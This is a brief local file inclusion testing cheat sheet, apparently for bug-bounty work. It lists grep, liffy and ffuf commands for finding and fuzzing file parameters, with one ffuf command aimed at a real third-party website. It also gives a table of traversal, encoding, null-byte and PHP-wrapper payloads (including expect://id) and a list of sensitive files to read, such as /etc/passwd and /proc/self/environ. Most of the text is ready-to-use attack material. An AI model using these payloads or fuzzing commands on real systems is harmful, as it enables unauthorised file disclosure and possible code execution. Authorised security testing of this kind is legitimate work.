Local File Inclusion (LFI)

Local File Inclusion testing methodology and exploitation techniques.

Requirements

You need URLS.txt file or params.txt for this testing.

LFI Testing Workflow

GREP for File/Folder Related Parameters

This is WHERE we identify possible file or directory inclusion

grep -Ei "file=|path=|page=|dir=|folder=|doc=|include=|inc=|template=|view=|load=|download=|read=|name=|resource=|img=|image=|pdf=" parameter.txt > lfi_candidates.txt

Or use gf patterns

Remove Duplicate URLs

sort -u lfi_candidates.txt > lfi_unique.txt

Using Liffy

liffy -l lfi_candidates.txt -w lfipayloads.txt

Using ffuf (Best)

ffuf -u "http://www.dailymotion.com/?page=FUZZ&id=1539508" \
-w lfipayloads.txt \
-mc 200 \
-fs 0 \
-t 40

Common LFI Payloads

Type Payload
Basic Linux ../../../etc/passwd
Double Encoding ....//....//etc/passwd
URL Encoded %2e%2e%2fetc%2fpasswd
Null Byte /etc/passwd%00
Windows ..\..\..\windows\win.ini
PHP Wrapper php://filter/read=convert.base64-encode/resource=index.php
Data Wrapper data://text/plain,
Expect Wrapper expect://id

LFI Test Files

  • /etc/passwd - Linux user info
  • /etc/hosts - Network configuration
  • /proc/self/environ - Environment variables
  • /var/log/apache2/access.log - Apache logs
  • C:\Windows\win.ini - Windows config
  • C:\Windows\System32\drivers\etc\hosts - Windows hosts
